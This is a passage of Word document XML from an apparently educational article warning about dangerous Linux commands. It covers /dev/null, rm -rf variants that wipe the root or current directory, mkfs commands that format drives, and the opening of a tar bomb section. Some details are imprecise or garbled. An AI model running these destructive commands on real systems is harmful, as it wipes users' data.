          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> is another risky command. </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>Dev/null</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>null device</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> is </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>a device file that discards all the data written on it but it reports that the writing operation is executed successfully</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">. It is also known as </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>bit bucked</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>black hole</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C985A68"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3. rm -rf command</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BD0F4F6"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shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>rm -rf</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> command is a fast way to </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>delete a folder and its content</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> in the Linux operating system. If you don’t know how to use it properly then it can become very dangerous to the system. The most common combinations and options used with rm-rf command are listed below:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A526F83" w14:textId="77777777" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="00482630" w:rsidP="00482630">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>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rm</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="262626"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> command is used to delete the files in Linux system. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="378CCEE1" w14:textId="77777777" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="00482630" w:rsidP="00482630">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>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rm -f</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="262626"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> command removes read-only files in folder without prompting. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FE962DC" w14:textId="77777777" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="00482630" w:rsidP="00482630">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>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rm -r</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="262626"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> command deletes the content of a folder recursively. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27825296" w14:textId="77777777" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="00482630" w:rsidP="00482630">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>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rm -d</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="262626"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> command is used to remove an empty directory but it will refuse to remove directory if it is not empty. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DA714F7" w14:textId="77777777" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="00482630" w:rsidP="00482630">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>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rm -rf/</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="262626"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> command is used for forced deletion (it deletes it even if it’s write protected) of all the content in root directory and sub folders.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DDC24B8" w14:textId="77777777" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="00482630" w:rsidP="00482630">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>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rm -rf*</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="262626"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> command is used for forced deletion of all the content in the current directory (directory you are currently working in) and sub folders. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21796A48" w14:textId="77777777" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="00482630" w:rsidP="00482630">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>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rm -rf.</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="262626"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> command is used for forced deletion of all the content in the current folder and sub folders. The </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="262626"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>rm -r.[^.]*</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="262626"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> command can also be used.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49EF11EA" w14:textId="77777777" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="00482630" w:rsidP="00482630">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1"/>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rm -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="262626"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="262626"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> command is used for removal of files and folders but a prompt will appear before removal.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="738F1BF7"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lastRenderedPageBreak/>
        <w:t xml:space="preserve">4. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>mkfs</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> command</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5430CA64"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proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>mkfs</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> can be a dangerous command for your Linux based system if you don’t know its purpose. </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">Anything written after the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>mkfs</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> will be formatted and replaced by a blank Linux file system</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6ED13B50"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All the commands mentioned below will format the hard drive and it requires administrator rights: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BDD55DC" w14:textId="77777777" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="00482630" w:rsidP="00482630">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="25"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="150"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="262626"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="262626"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>mkfs</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="2533C50C" w14:textId="77777777" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="00482630" w:rsidP="00482630">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="25"/>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mkfs.ext3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E1B1508" w14:textId="77777777" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="00482630" w:rsidP="00482630">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="25"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="150"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="262626"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="262626"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>mkfs.bfs</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="0002AC2D" w14:textId="77777777" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="00482630" w:rsidP="00482630">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="25"/>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mkfs.ext2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0193ECC7" w14:textId="77777777" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="00482630" w:rsidP="00482630">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="25"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="150"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="262626"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="262626"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>mkfs.minix</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="22EF4B23" w14:textId="77777777" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="00482630" w:rsidP="00482630">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="25"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="150"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="262626"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="262626"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>mkfs.msdos</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="512251E8" w14:textId="77777777" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="00482630" w:rsidP="00482630">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="25"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="150"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="262626"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="262626"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>mkfs.reiserfs</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="2CAD1580" w14:textId="77777777" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="00482630" w:rsidP="00482630">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="25"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="262626"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="262626"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>mkfs.vfat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="071E93FD"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The command </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>mkfs.cramfs</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> will do the same thing as the above but it does not require administrator rights to execute.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B200523"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5. Tar Bomb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5671DA58"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The </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>tar</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> command is used for combining multiple files into a single file (archived file) in </w:t>
